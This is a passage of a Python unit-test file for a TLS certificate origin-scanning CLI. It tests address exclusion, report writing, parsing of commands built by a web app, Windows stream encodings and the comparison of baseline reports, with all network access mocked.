            os.chmod(path, stat.S_IREAD)  # like a CSV still open in Excel (sharing lock)
            try:
                try:
                    open(path, 'r+b').close()
                    self.skipTest('a read-only file is still writable here (root?)')
                except OSError:
                    pass
                with mock.patch.object(sos, 'run_scan',
                                       side_effect=AssertionError('must not scan')):
                    code, _, err = run_main('-t', '127.0.0.1', '-n', 'a.example.com',
                                            '--csv', path)
            finally:
                os.chmod(path, stat.S_IREAD | stat.S_IWRITE)
            self.assertEqual(code, 2, err)
            self.assertIn('--csv: cannot write %s' % path, err)
            self.assertNotIn('must not scan', err)
            # the check neither truncates an existing report nor leaves a new file behind
            fresh = os.path.join(tmp, 'new.json')
            with mock.patch.object(sos, 'run_scan', side_effect=KeyboardInterrupt):
                code, _, _ = run_main('-t', '127.0.0.1', '-n', 'a.example.com', '--csv', path,
                                      '--json', fresh)
            self.assertEqual(code, 130)
            self.assertEqual(Path(path).read_text(encoding='utf-8'), 'last run\n')
            self.assertFalse(os.path.exists(fresh))

    def test_report_write_failure_after_the_scan_keeps_the_rest(self):
        real_write = sos._write_output

        def failing_csv(path, text, encoding='utf-8'):
            if path.endswith('.csv'):
                raise sos.UsageError('cannot write %s: Permission denied' % path)
            real_write(path, text, encoding)

        with tempfile.TemporaryDirectory() as tmp:
            json_path, csv_path = os.path.join(tmp, 'r.json'), os.path.join(tmp, 'r.csv')
            with mock.patch.object(sos, 'run_scan', return_value=sample_report()), \
                    mock.patch.object(sos, '_write_output', side_effect=failing_csv):
                code, out, err = run_main('-t', '127.0.0.1', '-n', 'a.example.com', '--csv',
                                          csv_path, '--json', json_path,
                                          '--fail-on-needs-update')
            self.assertTrue(os.path.isfile(json_path))  # the other report is still written
        self.assertEqual(code, sos.EXIT_OUTPUT_ERROR)
        self.assertEqual(sos.EXIT_OUTPUT_ERROR, 3)
        self.assertIn('SSL origin scan:', out)  # and the scan's summary is not lost
        self.assertIn('error: cannot write %s' % csv_path, err)
        self.assertIn('JSON report written to', err)
        self.assertNotIn('CSV report written to', err)

    def test_json_on_non_utf8_stdout_is_ascii_escaped(self):
        report = sample_report()
        report.warnings.append('Türkçe uyarı')
        escaped = sos.render_json(report, ensure_ascii=True)
        self.assertTrue(escaped.isascii())
        self.assertIn('\\u0131', escaped)
        self.assertEqual(json.loads(escaped), json.loads(sos.render_json(report)))
        self.assertIn('Türkçe uyarı', sos.render_json(report))

    def test_load_new_certificate_messages(self):
        leaf, messages = sos.load_new_certificate(str(FIXTURES / 'with_key.pem'), NOW)
        self.assertEqual(leaf.subject_cn, 'www.example-test.com.tr')
        self.assertTrue(any('PRIVATE KEY' in m for m in messages))
        leaf, messages = sos.load_new_certificate(str(FIXTURES / 'chain_reversed.pem'), NOW)
        self.assertEqual(leaf.subject_cn, 'www.example-test.com.tr')
        self.assertTrue(any('using the leaf' in m for m in messages))
        _, messages = sos.load_new_certificate(str(FIXTURES / 'cn_only.pem'),
                                               datetime(2036, 1, 1, tzinfo=timezone.utc))
        self.assertTrue(any('EXPIRED' in m for m in messages))
        _, messages = sos.load_new_certificate(str(FIXTURES / 'cli_renewed_wild.pem'),
                                               datetime(2025, 1, 1, tzinfo=timezone.utc))
        self.assertTrue(any('not valid before' in m for m in messages))


class ExcludeCliTests(unittest.TestCase):
    """--exclude end to end through main(), with the network replaced by a recorder."""

    def run_recorded(self, *args: str) -> Tuple[int, str, str, List[str]]:
        dialled = []  # type: List[str]
        lock = threading.Lock()

        def refuse(ip, port, timeout):
            with lock:
                dialled.append(ip)
            raise ConnectionRefusedError()

        with mock.patch.object(sos, 'tcp_connect', side_effect=refuse), \
                mock.patch.object(socket, 'getaddrinfo',
                                  side_effect=AssertionError('must not resolve')):
            code, out, err = run_main(*args)
        return code, out, err, dialled

    def test_slash29_minus_an_ip_and_a_slash31(self):
        with tempfile.TemporaryDirectory() as tmp:
            json_path = os.path.join(tmp, 'r.json')
            csv_path = os.path.join(tmp, 'r.csv')
            code, out, err, dialled = self.run_recorded(
                '-t', '198.51.100.0/29', '--exclude', '198.51.100.3', '198.51.100.4/31',
                '-n', 'www.example.com', '-p', '443,8443', '--json', json_path, '--csv', csv_path)
            self.assertEqual(code, 0, err)
            doc = read_json(json_path)
            with open(csv_path, encoding='utf-8-sig', newline='') as handle:
                records = list(csv.DictReader(handle))
        # hosts .1-.6 minus .3, .4, .5: only .1, .2 and .6 are ever dialled (2 ports each)
        self.assertEqual(sorted(set(dialled)), ['198.51.100.1', '198.51.100.2', '198.51.100.6'])
        self.assertEqual(len(dialled), 6)
        self.assertEqual(doc['options']['exclude'], ['198.51.100.3', '198.51.100.4/31'])
        self.assertEqual(doc['summary']['excludedAddresses'], 3)
        self.assertEqual(doc['summary']['servers'], 3)
        self.assertEqual([e['ip'] for e in doc['excluded']],
                         ['198.51.100.3', '198.51.100.4', '198.51.100.5'])
        self.assertEqual(sum(1 for r in records if r['status'] == 'EXCLUDED'), 3)
        self.assertIn('Excluded by --exclude (never probed): 3 addresses - 198.51.100.3, '
                      '198.51.100.4/31', out)
        self.assertIn('Scanning 3 server(s) / 3 IP(s) x 2 port(s)', err)
        self.assertIn('(3 excluded address(es) left out) ...', err)

    def test_exclude_file_repeatable_and_ipv6(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'never.txt')
            with open(path, 'w', encoding='utf-8') as handle:
                handle.write('# hosts we may not touch\n2001:db8::2\n198.51.100.0/31 // net\n')
            code, out, err, dialled = self.run_recorded(
                '-t', '198.51.100.0/30', '2001:db8::/126', '--exclude', path,
                '--exclude', '2001:db8::3', '-n', 'www.example.com', '--json', '-', '-q')
        self.assertEqual(code, 0, err)
        doc = json.loads(out)
        self.assertEqual(sorted(set(dialled)), ['198.51.100.2', '2001:db8::1'])
        self.assertEqual(doc['options']['exclude'], ['2001:db8::2', '198.51.100.0/31', '2001:db8::3'])
        self.assertEqual(doc['summary']['excludedAddresses'], 3)
        self.assertEqual(err, '')

    def test_unmatched_rule_is_a_warning(self):
        code, out, err, dialled = self.run_recorded(
            '-t', '198.51.100.1', '--exclude', '203.0.113.0/24', '-n', 'www.example.com')
        self.assertEqual(code, 0, err)
        self.assertEqual(dialled, ['198.51.100.1'])
        self.assertIn('warning: --exclude 203.0.113.0/24 matched no target address', err)
        self.assertIn('0 addresses (no target matched 203.0.113.0/24)', out)

    def test_everything_excluded_is_a_usage_error(self):
        code, _, err, dialled = self.run_recorded(
            '-t', '198.51.100.0/30', '--exclude', '198.51.100.0/24', '-n', 'www.example.com')
        self.assertEqual(code, 2)
        self.assertIn('all 2 target address(es) are excluded by --exclude', err)
        self.assertEqual(dialled, [])

    def test_hostnames_are_refused_before_any_lookup(self):
        code, _, err, dialled = self.run_recorded(
            '-t', 'www.example.com', '--exclude', 'mail.example.com', '-n', 'www.example.com')
        self.assertEqual(code, 2)
        self.assertIn('--exclude takes IP addresses and CIDRs, not hostnames', err)
        self.assertNotIn('must not resolve', err)
        self.assertEqual(dialled, [])

    def test_resolved_hostname_targets_are_excluded_by_address(self):
        resolver_answers = {'app.internal': ['198.51.100.7', '198.51.100.8']}

        def fake_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (ip, 0))
                    for ip in resolver_answers[host]]

        dialled = []  # type: List[str]

        def refuse(ip, port, timeout):
            dialled.append(ip)
            raise ConnectionRefusedError()

        with mock.patch.object(sos, 'tcp_connect', side_effect=refuse), \
                mock.patch.object(socket, 'getaddrinfo', side_effect=fake_getaddrinfo):
            code, out, err = run_main('-t', 'app.internal', '--exclude', '198.51.100.8',
                                      '-n', 'www.example.com', '--json', '-', '-q')
        self.assertEqual(code, 0, err)
        self.assertEqual(dialled, ['198.51.100.7'])
        doc = json.loads(out)
        self.assertEqual(doc['excluded'], [{'server': 'app.internal', 'ip': '198.51.100.8',
                                            'excludedBy': '198.51.100.8'}])

    def test_numeric_target_is_never_resolved(self):
        code, _, err, dialled = self.run_recorded('-t', '2026092401', '-n', 'www.example.com')
        self.assertEqual(code, 2)
        self.assertIn("invalid target '2026092401'", err)
        self.assertIn(SERIAL_ADDRESS, err)
        self.assertEqual(dialled, [])
        code, _, err, _ = self.run_recorded('-t', '198.51.100.1', '-n', '0x7f.0x1')
        self.assertEqual(code, 2)
        self.assertIn("invalid name '0x7f.0x1' (-n)", err)


class ExcludeReviewTests(unittest.TestCase):
    """Review fixes: unused-rule detection speed and clearer usage errors."""

    def test_unused_excludes_is_not_rules_times_addresses(self):
        servers, _ = sos.load_targets(['10.20.0.0/17'])
        # one /18 excludes 16k addresses; 400 single-IP rules outside the targets are unused
        rules = sos.load_excludes(['10.20.0.0/18'] + ['10.30.%d.%d' % (i // 200, i % 200 + 1)
                                                      for i in range(400)])
        kept, excluded = sos.apply_excludes(servers, rules)
        self.assertEqual(sos.excluded_address_count(excluded), 16384 - 1)
        started = time.monotonic()
        unused = sos.unused_excludes(rules, excluded)
        elapsed = time.monotonic() - started
        self.assertEqual(len(unused), 400)
        self.assertNotIn('10.20.0.0/18', unused)
        self.assertLess(elapsed, 3)  # was ~40 s (every rule x every excluded address)

    def test_unused_excludes_matches_contains(self):
        servers, _ = sos.load_targets(['198.51.100.0/29', '2001:db8::/126', '::ffff:203.0.113.9'])
        rules = sos.load_excludes(['198.51.100.2', '198.51.100.0/30', '2001:db8::3',
                                   '203.0.113.9', '::ffff:198.51.100.6/127', '2001:db8::/120',
                                   '198.51.100.7-9', '192.0.2.0/24', '2001:db8:1::/48'])
        _, excluded = sos.apply_excludes(servers, rules)
        addresses = {entry.ip for entry in excluded}
        want = [rule.label for rule in rules
                if not any(rule.contains(ip) for ip in addresses)]
        self.assertEqual(sos.unused_excludes(rules, excluded), want)
        # .7 is the /29 broadcast address, never a target, so the .7-.9 range matches nothing
        self.assertEqual(want, ['198.51.100.7-198.51.100.9', '192.0.2.0/24', '2001:db8:1::/48'])

    def test_clear_errors_for_bad_ranges_and_zero_padded_blocks(self):
        with self.assertRaisesRegex(sos.UsageError, "'198.51.100.5-09' is not a valid IP range"):
            sos.load_excludes(['198.51.100.5-09'])
        for token in ('010.0.0.0/24', '010.0.0.1-5'):
            with self.subTest(token=token):
                with self.assertRaisesRegex(sos.UsageError, 'leading zero is ambiguous'):
                    sos.parse_target_tokens(token)


WEB_APP_ANSWERS = {'origin.example.com': ['192.0.2.20'],
                   'app.example.net': ['2001:db8::20', '192.0.2.21']}
# The two zone hand-off downloads (assets/js/lib/zoneorigins.js handoffFiles): a '#'
# header with an em dash, then one entry per line - "<server> <ip>", bare IPs, host names.
ZONE_HEADER = '# DomainScope zone hand-off for example.com — 2026-09-24T12:00:00.000Z\n'
ZONE_NAMES_TXT = ZONE_HEADER + '*.example.com\nwww.example.com\n_sip._tls.example.com\n'
ZONE_TARGETS_TXT = (ZONE_HEADER + 'web01 192.0.2.10\n192.0.2.12\n2001:db8::10\n'
                    'origin.example.com\napp.example.net\n')


class WebAppCommandTests(unittest.TestCase):
    """The sweep commands the web app prints (cmdline.js buildSweepCommand, zone hand-off)
    are accepted by the CLI parser as the shell would split them, and scan exactly the
    intended addresses - excluded ones never."""

    def run_command(self, command: str, files: Optional[Dict[str, str]] = None
                    ) -> Tuple[int, str, str, List[Tuple[str, int]], Tuple[object, Optional[Dict]]]:
        argv = shlex.split(command)  # POSIX sh rules; the PowerShell form splits the same
        self.assertIn(argv[0], ('python3', 'python'), command)
        self.assertTrue(argv[1].endswith('ssl_origin_scan.py'), command)
        args = argv[2:]
        parsed = sos.build_parser().parse_args(args)  # SystemExit(2) would fail the test
        dialled = []  # type: List[Tuple[str, int]]
        lock = threading.Lock()

        def refuse(ip, port, timeout):
            with lock:
                dialled.append((ip, port))
            raise ConnectionRefusedError()

        def fake_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
            if host not in WEB_APP_ANSWERS:
                raise socket.gaierror(-2, 'Name or service not known')
            return [(socket.AF_INET6 if ':' in ip else socket.AF_INET, socket.SOCK_STREAM, 6,
                     '', (ip, 0)) for ip in WEB_APP_ANSWERS[host]]

        cwd = os.getcwd()
        with tempfile.TemporaryDirectory() as tmp:
            for name, text in (files or {}).items():
                with open(os.path.join(tmp, name), 'w', encoding='utf-8', newline='\n') as handle:
                    handle.write(text)
            shutil.copyfile(str(FIXTURES / 'cli_renewed_wild.pem'), os.path.join(tmp, 'new.pem'))
            os.chdir(tmp)
            try:
                with mock.patch.object(sos, 'tcp_connect', side_effect=refuse), \
                        mock.patch.object(socket, 'getaddrinfo', side_effect=fake_getaddrinfo):
                    code, out, err = run_main(*args, '-q')
                report = read_json('report.json') if os.path.isfile('report.json') else None
            finally:
                os.chdir(cwd)
        return code, out, err, dialled, (parsed, report)

    def assert_scanned(self, command: str, want: Sequence[str], ports: Sequence[int] = (443,),
                       files: Optional[Dict[str, str]] = None):
        code, out, err, dialled, extra = self.run_command(command, files)
        self.assertEqual(code, 0, '%s\n%s' % (command, err))
        self.assertEqual(sorted(dialled), sorted((ip, p) for ip in want for p in ports), command)
        return out, extra

    def test_generated_inline_commands(self):
        self.assert_scanned(
            'python3 cli/ssl_origin_scan.py -t 192.0.2.0/30 2001:db8::10 '
            '-n a.example.com b.example.org',
            ['192.0.2.1', '192.0.2.2', '2001:db8::10'])
        self.assert_scanned(
            'python3 cli/ssl_origin_scan.py -t 192.0.2.0/30 '
            '-n _sip._tls.example.com xn--bcher-kva.example -p 8443',
            ['192.0.2.1', '192.0.2.2'], ports=(8443,))

    def test_generated_exclude_ports_cert_and_json(self):
        _, (parsed, report) = self.assert_scanned(
            'python3 cli/ssl_origin_scan.py -t 192.0.2.0/29 --exclude 192.0.2.5 192.0.2.6/31 '
            '-n a.example.com -p 443,8443 --cert new.pem --json report.json',
            ['192.0.2.1', '192.0.2.2', '192.0.2.3', '192.0.2.4'], ports=(443, 8443))
        self.assertEqual(parsed.exclude, ['192.0.2.5', '192.0.2.6/31'])
        self.assertEqual(parsed.names, ['a.example.com'])
        self.assertEqual(report['summary']['excludedAddresses'], 2)
        self.assertEqual(report['options']['exclude'], ['192.0.2.5', '192.0.2.6/31'])

    def test_generated_powershell_command_with_ipv6_exclude(self):
        self.assert_scanned(
            'python cli/ssl_origin_scan.py -t 198.51.100.0/30 2001:db8::/126 '
            '--exclude 2001:db8::2 198.51.100.2 -n a.example.com',
            ['198.51.100.1', '2001:db8::1', '2001:db8::3'])

    def test_generated_names_file_form(self):
        names = '\n'.join('h%d.example.com' % i for i in range(250)) + '\n'
        _, (parsed, _) = self.assert_scanned(
            'python3 cli/ssl_origin_scan.py -t 192.0.2.0/30 -n proxied-names.txt',
            ['192.0.2.1', '192.0.2.2'], files={'proxied-names.txt': names})
        self.assertEqual(parsed.names, ['proxied-names.txt'])

    def test_host_targets_and_quoted_wildcard_names(self):
        for command in (
                "python3 cli/ssl_origin_scan.py -t 192.0.2.10 origin.example.com app.example.net "
                "-n '*.example.com' www.example.com --json report.json",
                "python cli/ssl_origin_scan.py -t 192.0.2.10 origin.example.com app.example.net "
                "-n '*.example.com' www.example.com --json report.json"):
            with self.subTest(command=command):
                _, (parsed, report) = self.assert_scanned(
                    command, ['192.0.2.10', '192.0.2.20', '192.0.2.21', '2001:db8::20'])
                self.assertEqual(parsed.names, ['*.example.com', 'www.example.com'])
                self.assertIn({'name': '*.example.com', 'sni': mock.ANY, 'wildcard': True},
                              report['names'])

    def test_zone_hand_off_files_with_exclude(self):
        _, (parsed, report) = self.assert_scanned(
            'python3 cli/ssl_origin_scan.py -t zone-targets.txt --exclude 192.0.2.21 '
            '-n zone-names.txt --json report.json',
            ['192.0.2.10', '192.0.2.12', '2001:db8::10', '192.0.2.20', '2001:db8::20'],
            files={'zone-targets.txt': ZONE_TARGETS_TXT, 'zone-names.txt': ZONE_NAMES_TXT})
        self.assertEqual(parsed.targets, ['zone-targets.txt'])
        self.assertEqual([n['name'] for n in report['names'] if not n['wildcard']],
                         ['example.com', 'www.example.com', '_sip._tls.example.com'])
        self.assertEqual(report['excluded'], [{'server': 'app.example.net', 'ip': '192.0.2.21',
                                               'excludedBy': '192.0.2.21'}])
        self.assertEqual(report['warnings'], [])

    @unittest.skipUnless(_node_major() >= 22, 'needs Node 22+ to run assets/js/lib/cmdline.js')
    def test_commands_built_by_cmdline_js(self):
        """Contract: whatever cmdline.js emits today is parsed and honoured by the CLI."""
        script = r'''
import { buildSweepCommand } from %s;
const cases = [
  { targets: ['192.0.2.0/30', '2001:db8::10'], names: ['a.example.com', 'b.example.org'] },
  { targets: ['192.0.2.0/29'], names: ['a.example.com'], exclude: ['192.0.2.5', '192.0.2.6/31', '203.0.113.0/24'],
    ports: [443, 8443], cert: 'new.pem', json: 'report.json' },
  { targets: ['198.51.100.0/30', '2001:db8::/126'], names: ['a.example.com'], exclude: '2001:db8::2, 198.51.100.2',
    shell: 'powershell' },
  { targets: ['192.0.2.0/30'], names: Array.from({ length: 250 }, (_, i) => `h${i}.example.com`) },
  { targets: ['192.0.2.10', 'origin.example.com'], names: ['*.example.com', 'www.example.com'],
    allowHostTargets: true, allowWildcardNames: true, exclude: ['192.0.2.20'] },
  { targets: ['192.0.2.10', 'origin.example.com'], names: ['*.example.com', 'www.example.com'],
    allowHostTargets: true, allowWildcardNames: true, shell: 'powershell' }
];
const out = cases.map((opts) => {
  const r = buildSweepCommand({ script: 'cli/ssl_origin_scan.py', ...opts });
  return { opts, command: r.command, names: r.names, namesFile: r.namesFile, targets: r.targets,
           hostTargets: r.hostTargets || [], exclude: r.exclude || [] };
});
console.log(JSON.stringify(out));
''' % json.dumps((ROOT / 'assets' / 'js' / 'lib' / 'cmdline.js').as_uri())
        proc = subprocess.run([shutil.which('node'), '--input-type=module', '-e', script],
                              capture_output=True, text=True, timeout=60, cwd=str(ROOT))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        built = json.loads(proc.stdout)
        self.assertEqual(len(built), 6)
        for case in built:
            with self.subTest(opts=case['opts']):
                self.assertIsNotNone(case['command'])
                python = 'python' if case['opts'].get('shell') == 'powershell' else 'python3'
                files = {}
                if case['namesFile']:  # the page offers this file next to the command
                    files[case['namesFile']] = '\n'.join(case['names']) + '\n'
                code, _, err, dialled, (parsed, _) = self.run_command(
                    '%s %s' % (python, case['command']), files)
                self.assertEqual(code, 0, '%s\n%s' % (case['command'], err))
                self.assertTrue(dialled)
                allowed = set()
                for target in list(case['targets']) + list(case['hostTargets']):
                    if target in WEB_APP_ANSWERS:
                        allowed.update(WEB_APP_ANSWERS[target])
                    elif sos.normalize_ip(target):
                        allowed.add(sos.normalize_ip(target))
                    else:
                        allowed.update(sos.expand_ip_block(target) or [])
                rules = sos.load_excludes(case['exclude']) if case['exclude'] else []
                requested = case['opts'].get('exclude') or []
                if isinstance(requested, str):
                    requested = [t for t in re.split(r'[\s,]+', requested) if t]
                # every requested exclusion reaches the CLI: with IP / CIDR targets only the
                # ones inside a target matter, and a kept host target makes cmdline.js emit all
                # of them (its address is only known once the CLI resolves it)
                rules = rules + sos.load_excludes(requested) if requested else rules
                for ip, _port in dialled:
                    self.assertIn(ip, allowed)
                    self.assertFalse(any(rule.contains(ip) for rule in rules), ip)
                self.assertEqual(parsed.exclude, case['exclude'])


TURKISH_HELP_LINE =('Türkçe: yeni sertifikanın hangi sunuculara '
                     'yüklenmesi gerektiğini bulur, örnek:')


class StreamEncodingTests(unittest.TestCase):
    """stdout / stderr encodings that avoid mojibake ('T³rkþe') on Windows consoles."""

    def choose(self, current, kind, env=None, cp=857, windows=True, utf8_mode=False):
        return sos._choose_stream_encoding(current, kind, env=env or {}, console_cp=cp,
                                           windows=windows, utf8_mode=utf8_mode)

    def test_windows_matrix(self):
        cases = [
            # (current, kind, env, console cp) -> target (None = keep)
            (('cp1254', 'pipe', {}, 857), 'cp857'),       # cmd `| more`, PowerShell pipes
            (('cp1252', 'pipe', {}, 437), 'cp437'),
            (('cp857', 'pipe', {}, 857), None),           # already the console code page
            (('cp1254', 'pipe', {}, 65001), 'utf-8'),     # chcp 65001 / UTF-8 console
            (('cp1254', 'pipe', {}, 0), 'utf-8'),         # no console (service, CI runner)
            (('cp1254', 'pipe', {}, 12345), 'utf-8'),     # unknown code page
            (('cp1254', 'pipe', {'MSYSTEM': 'MINGW64'}, 857), 'utf-8'),  # Git Bash / mintty
            (('cp1254', 'pipe', {'TERM': 'xterm-256color'}, 857), 'utf-8'),
            (('cp1254', 'pipe', {'TERM': 'cygwin'}, 857), 'utf-8'),
            (('cp1254', 'file', {}, 857), 'utf-8'),       # `> out.txt`
            (('cp1254', 'other', {}, 857), 'utf-8'),
            (('utf-8', 'console', {}, 857), None),        # the console API writes UTF-16
            (('UTF-8', 'pipe', {}, 857), None),
            (('cp1254', 'pipe', {'PYTHONIOENCODING': 'cp1254'}, 857), None),  # explicit wins
        ]
        for (current, kind, env, cp), want in cases:
            with self.subTest(current=current, kind=kind, env=env, cp=cp):
                self.assertEqual(self.choose(current, kind, env, cp), want)
        self.assertIsNone(self.choose('cp1254', 'pipe', utf8_mode=True))

    def test_posix(self):
        self.assertEqual(self.choose('ascii', 'pipe', windows=False), 'utf-8')
        self.assertEqual(self.choose('ANSI_X3.4-1968', 'console', windows=False), 'utf-8')
        self.assertIsNone(self.choose('utf-8', 'pipe', windows=False))
        self.assertIsNone(self.choose('iso8859-9', 'console', windows=False))

    def test_transliteration_instead_of_mojibake_or_crash(self):
        codecs.register_error(sos._TRANSLIT_ERRORS, sos._translit_errors)
        text = 'Türkçe ışİĞ → ’x’ ✓ 中'
        # cp437 has ü and ç but no ı ş İ Ğ: look-alikes instead of '?' (unknown CJK -> '?')
        self.assertEqual(text.encode('cp437', sos._TRANSLIT_ERRORS),
                         b"T\x81rk\x87e isIG -> 'x' v ?")
        self.assertEqual(text.encode('cp857', sos._TRANSLIT_ERRORS).decode('cp857'),
                         "Türkçe ışİĞ -> 'x' v ?")
        with self.assertRaises(UnicodeDecodeError):
            b'\xff'.decode('utf-8', sos._TRANSLIT_ERRORS)

    @unittest.skipIf(sys.flags.utf8_mode, 'Python UTF-8 mode keeps UTF-8 on purpose')
    def test_configure_streams_switches_a_pipe_to_the_console_code_page(self):
        out = io.TextIOWrapper(io.BytesIO(), encoding='cp1254')
        err = io.TextIOWrapper(io.BytesIO(), encoding='cp1254')
        env = {k: v for k, v in os.environ.items()
               if k not in ('PYTHONIOENCODING', 'MSYSTEM', 'TERM')}
        with mock.patch.object(sos, '_IS_WINDOWS', True), \
                mock.patch.object(sos, '_stream_kind', return_value='pipe'), \
                mock.patch.object(sos, '_console_output_cp', return_value=857), \
                mock.patch.dict(os.environ, env, clear=True), \
                mock.patch.object(sys, 'stdout', out), mock.patch.object(sys, 'stderr', err):
            sos._configure_streams()
            sys.stdout.write(TURKISH_HELP_LINE + ' 中')
            sys.stdout.flush()
        self.assertEqual(out.encoding, 'cp857')
        self.assertEqual(err.encoding, 'cp857')
        self.assertEqual(out.buffer.getvalue().decode('cp857'), TURKISH_HELP_LINE + ' ?')

    def test_help_redirected_to_a_file_is_utf8(self):
        env = {k: v for k, v in os.environ.items() if k != 'PYTHONIOENCODING'}
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'help.txt')
            with open(path, 'wb') as handle:
                proc = subprocess.run([sys.executable, str(CLI_PATH), '--help'], stdout=handle,
                                      stderr=subprocess.PIPE, env=env, timeout=60)
            self.assertEqual(proc.returncode, 0, proc.stderr)
            with open(path, 'rb') as handle:
                data = handle.read()
        self.assertIn(TURKISH_HELP_LINE, data.decode('utf-8'))


# ====================================================================== monitoring

RENEWED = fixture_cert('cli_renewed_wild.pem')
WILD = 'a.wild.example.net'
WWW = 'www.example-test.com.tr'
# rsa_multi_san.pem (www.example-test.com.tr) expires 2034-06-01: 12 days after this
BEFORE_RSA_EXPIRY = datetime(2034, 5, 20, 0, 0, 0, tzinfo=timezone.utc)


def scan_report(servers, tls, connect=None, names=(WILD, WWW), new_certs=(RENEWED,),
                ports=(443,), exclude=(), now=None):
    """A report over FakeNetwork; ``now`` fixes the scan's clock (days left)."""
    network = FakeNetwork(connect or {}, tls)
    with contextlib.ExitStack() as stack:
        if now is not None:
            stack.enter_context(mock.patch.object(sos, '_utcnow', return_value=now))
        return sos.run_scan(servers, sos.build_probe_names(list(names)), list(ports),
                            new_certs=list(new_certs), timeout=1, workers=4,
                            connect_fn=network.connect_fn, tls_fn=network.tls_fn,
                            exclude=list(exclude))


def scan_doc(*args, **kwargs):
    return sos.report_to_dict(scan_report(*args, **kwargs))


def fleet_before(now=None):
    return scan_report(
        [sos.Server('web', ['10.0.0.1']), sos.Server('upd', ['10.0.0.2']),
         sos.Server('db', ['10.0.0.3']), sos.Server('gone', ['10.0.0.4']),
         sos.Server('down', ['10.0.0.5']), sos.Server('flaky', ['10.0.0.6']),
         sos.Server('shared-a', ['10.0.0.7']), sos.Server('shared-b', ['10.0.0.7'])],
        {'10.0.0.1': by_old_or_new(EC_DER), '10.0.0.2': by_old_or_new(RENEWED_DER),
         '10.0.0.3': by_old_or_new(RENEWED_DER), '10.0.0.4': by_old_or_new(EC_DER),
         '10.0.0.6': by_old_or_new(RENEWED_DER), '10.0.0.7': by_old_or_new(RENEWED_DER)},
        connect={'10.0.0.5': ConnectionRefusedError()}, now=now)


def fleet_after(now=None):
    """fleet_before, a day later: 9 changes (see BaselineTests.test_every_kind_of_change)."""
    renewed = by_old_or_new(RENEWED_DER)
    return scan_report(
        [sos.Server('web', ['10.0.0.1']), sos.Server('upd', ['10.0.0.2']),
         sos.Server('db', ['10.0.0.3']), sos.Server('gone', ['10.0.0.4']),
         sos.Server('down', ['10.0.0.5']), sos.Server('flaky', ['10.0.0.6']),
         sos.Server('shared-a', ['10.0.0.7']), sos.Server('shared-b', ['10.0.0.7']),
         sos.Server('new', ['10.0.0.8'])],
        {'10.0.0.1': renewed,                                     # installed
         '10.0.0.2': by_old_or_new(EC_DER),                       # rolled back
         '10.0.0.5': renewed,                                     # port open again
         '10.0.0.6': lambda sni: socket.timeout('timed out') if sni == WILD else renewed(sni),
         '10.0.0.7': lambda sni: CN_ONLY_DER if sni == WILD else renewed(sni),  # vhost gone
         '10.0.0.8': renewed},                                    # a new address
        connect={'10.0.0.3': ConnectionRefusedError()},           # port closed now
        names=(WILD, WWW, 'extra.example.com'), exclude=['10.0.0.4'], now=now)


def change_keys(changes):
    return [(c['scope'], c['kind'], c['transition'], c['ip'], c['name']) for c in changes]


class BaselineTests(unittest.TestCase):

    def write(self, tmp, name, data):
        path = os.path.join(tmp, name)
        Path(path).write_bytes(data if isinstance(data, bytes) else data.encode('utf-8'))
        return path

    def test_load_baseline_reads_utf8_and_utf16_reports(self):
        text = sos.render_json(fleet_before())
        with tempfile.TemporaryDirectory() as tmp:
            for name, data in (('plain.json', text.encode('utf-8')),
                               ('bom.json', b'\xef\xbb\xbf' + text.encode('utf-8')),
                               ('ps51.json', codecs.BOM_UTF16_LE + text.encode('utf-16-le'))):
                with self.subTest(name=name):
                    doc = sos.load_baseline(self.write(tmp, name, data))
                    self.assertEqual(doc['tool'], 'ssl_origin_scan')
            missing = os.path.join(tmp, 'missing.json')
            self.assertIsNone(sos.load_baseline(missing, allow_missing=True))
            with self.assertRaises(sos.UsageError) as ctx:
                sos.load_baseline(missing)
            self.assertIn('does not exist', str(ctx.exception))
            with self.assertRaises(sos.UsageError) as ctx:
                sos.load_baseline(tmp)  # a directory
            self.assertIn('cannot read', str(ctx.exception))

    def test_unusable_baselines_are_clear_usage_errors(self):
        good = json.loads(sos.render_json(fleet_before()))

        def with_row(**fields):
            doc = json.loads(json.dumps(good))
            doc['results'][0].update(fields)
            return json.dumps(doc)

        cases = {
            '': 'is not JSON',
            '{"tool": ': 'is not JSON',
            '[1, 2]': 'not a --json report',
            json.dumps({'tool': 'other', 'results': []}): 'not a --json report',
            json.dumps(dict(good, version='2.0.0')): "version '2.0.0'",
            json.dumps(dict(good, version='\x1b[2K9')): "version '\\x1b[2K9'",
            json.dumps(dict(good, results={})): 'no "results" list',
            with_row(port='443'): 'results[0] has no valid "port"',
            with_row(port=True): 'results[0] has no valid "port"',
            with_row(ip='web01'): 'results[0] has no valid "ip"',
            with_row(status='updated'): 'results[0] has no valid "status"',
            with_row(certSha256='abc'): 'results[0] has no valid "certSha256"',
            with_row(name=5): 'results[0] has a "name" that is not text',
            '[' * 100000: 'is not JSON',
        }
        with tempfile.TemporaryDirectory() as tmp:
            for index, (text, needle) in enumerate(cases.items()):
                path = self.write(tmp, 'b%d.json' % index, text)
                with self.subTest(needle=needle, text=text[:40]):
                    with self.assertRaises(sos.UsageError) as ctx:
                        sos.load_baseline(path)
                    self.assertIn('--baseline', str(ctx.exception))
                    self.assertIn(needle, str(ctx.exception))
                    self.assertNotIn('\x1b', str(ctx.exception))
        # the same major version, rows of a probe kind or a status a later version adds
        doc = json.loads(json.dumps(good))
        doc['version'] = sos.__version__.split('.')[0] + '.9.0'
        doc['results'].append(dict(doc['results'][0], probe='future-kind'))
        doc['results'][0]['status'] = 'ORIGIN_CA'
        self.assertIsNone(sos.baseline_problem(doc))

    def test_every_kind_of_change(self):
        before, after = sos.report_to_dict(fleet_before()), sos.report_to_dict(fleet_after())
        changes = sos.compare_reports(before, after)
        self.assertEqual(change_keys(changes), [
            ('name', 'appeared', None, None, 'extra.example.com'),
            ('row', 'status', 'updated', '10.0.0.1', WILD),
            ('row', 'status', 'regressed', '10.0.0.2', WILD),
            ('endpoint', 'status', 'failed', '10.0.0.3', None),
            ('endpoint', 'status', 'recovered', '10.0.0.5', None),
            ('row', 'status', 'failed', '10.0.0.6', WILD),
            ('row', 'status', 'unhosted', '10.0.0.7', WILD),
            ('endpoint', 'appeared', None, '10.0.0.8', None),
